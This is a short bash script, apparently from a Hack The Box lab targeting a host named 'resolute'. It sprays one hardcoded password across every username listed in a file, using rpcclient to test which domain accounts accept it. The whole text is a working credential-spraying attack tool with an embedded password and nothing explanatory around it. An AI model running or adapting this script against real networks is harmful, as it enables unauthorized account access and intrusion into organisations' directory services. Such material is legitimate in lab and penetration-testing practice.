#!/bin/bash

for u in `cat ADusers.txt`; do 
	echo -n "[*] user : $u " && 
	rpcclient -U "$u%Serv3r4Admin4cc123!" -c "getusername;quit" htb.resolute
done
